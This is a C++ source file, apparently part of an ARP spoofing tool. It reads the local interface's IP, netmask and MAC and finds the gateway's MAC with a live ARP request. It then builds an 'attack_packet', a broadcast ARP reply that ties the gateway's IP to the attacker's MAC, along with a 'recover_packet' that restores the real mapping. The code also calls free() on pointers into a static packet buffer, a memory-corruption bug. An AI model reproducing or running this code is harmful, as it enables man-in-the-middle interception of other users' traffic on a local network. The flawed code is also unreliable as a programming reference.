#include "arp.h"

void Arp::setArp(char *dev)
{
    struct ether_header *eth = (struct ether_header *)(packet);
    struct arp_header *arp = (struct arp_header *)(packet + ETH_HEADER_SIZE);

    strcpy(this->dev, dev);

    uint8_t my_mac[6];
    uint8_t my_ip[4];

    uint8_t ap_ip[4];
    uint8_t subnet[4];

    char notuse[20];

    //

    get_my_info(dev, subnet, my_ip, my_mac);

    char subnet_str[1024];
    char ip_str[1024];
    char mac_str[1024];

    sprintf(subnet_str, "subnet = %d.%d.%d.%d", subnet[0], subnet[1], subnet[2], subnet[3]);
    sprintf(ip_str, "ip = %d.%d.%d.%d", my_ip[0], my_ip[1], my_ip[2], my_ip[3]);
    sprintf(mac_str, "mac = %02X:%02X:%02X:%02X:%02X:%02X", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);

    printf("%s\n%s\n%s\n\n", subnet_str, ip_str, mac_str);

    memcpy(ap_ip, my_ip, 4);

    for (int i = 0; i < 4; i++)
        ap_ip[i] = ap_ip[i] & subnet[i];

    ap_ip[3] += 0b1;

    // make common
    memset(eth->ether_dhost, 0xff, 6);
    memcpy(eth->ether_shost, my_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);

    arp->hw_type = htons(0x0001);
    arp->proto_type = htons(0x0800);
    arp->hlen = 0x06;
    arp->plen = 0x04;

    // make request_packet
    arp->oper = htons(0x0001);
    memcpy(arp->smac, my_mac, 6);
    memcpy(arp->sip, my_ip, 4);
    memset(arp->dmac, 0x00, 6);
    memcpy(arp->dip, ap_ip, 4);

    memcpy(request_packet, packet, 50);

    // get gateway mac
    uint8_t gateway_mac[6];
    
    getGatewayMac(my_mac, gateway_mac);

    // make recover_packet
    arp->oper = htons(0x0002);
    memcpy(arp->smac, gateway_mac, 6);
    memcpy(arp->sip, ap_ip, 4);
    memset(arp->dmac, 0xff, 6);
    memset(arp->dip, 0x00, 4);

    memcpy(recover_packet, packet, 50);

    // make attack_packet
    memcpy(arp->smac, my_mac, 6);

    memcpy(attack_packet, packet, 50);

    free(eth);
    free(arp);

    printf("set arp OK\n");
}

void Arp::getGatewayMac(uint8_t * my_mac, uint8_t *gateway_mac)
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];

    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL)
    {
        printf("pcap open error...\n");
        return;
    }

    if (pcap_sendpacket(handle, request_packet, ETH_HEADER_SIZE + ARP_HEADER_SIZE) != 0)
    {
        printf("error\n");
    }

    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *temp;
        int res = pcap_next_ex(handle, &header, &temp);

        if (res == 0)
            continue;
        if (res == -1 || res == -2)
            break;

        struct ether_header *eth = (struct ether_header *)(temp);
        if (eth->ether_type != htons(ETHERTYPE_ARP))
            continue;
        struct arp_header *arp = (struct arp_header *)(temp + ETH_HEADER_SIZE);
        if (arp->oper != ntohs(0x0002))
            continue;
        if (memcmp(arp->dmac, my_mac, 6) != 0)
            continue;
        
        printf("get gateway_mac = %02X:%02X:%02X:%02X:%02X:%02X\n", arp->smac[0],arp->smac[1],arp->smac[2],arp->smac[3],arp->smac[4],arp->smac[5]);

        memcpy(gateway_mac, arp->smac, 6);
        break;
    }

    pcap_close(handle);
}

bool check_dev(char *dev)
{
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0)
        return false;

    return true;
}

void get_my_info(char *dev, uint8_t *subnet, uint8_t *ip, uint8_t *mac)
{

    /*        Get my IP Address      */
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    ioctl(fd, SIOCGIFNETMASK, &ifr);

    memcpy(subnet, &((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr), 4);

    ioctl(fd, SIOCGIFADDR, &ifr);

    memcpy(ip, &((((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr), 4);

    close(fd);

    /*************************************************************************************************/

    /*        Get my Mac Address      */
    struct ifconf ifc;
    char buf[1024];
    bool success = false;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1)
    { /* handle error*/
    };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1)
    { /* handle error */
    }

    ifreq *it = ifc.ifc_req;
    const ifreq *const end = it + (ifc.ifc_len / sizeof(ifreq));

    for (; it != end; ++it)
    {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0)
        {
            if (!(ifr.ifr_flags & IFF_LOOPBACK)) // don't count loopback
            {
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0)
                {
                    success = true;
                    break;
                }
            }
        }
        else
        { /* handle error */
        }
    }
    if (success)
        memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
}
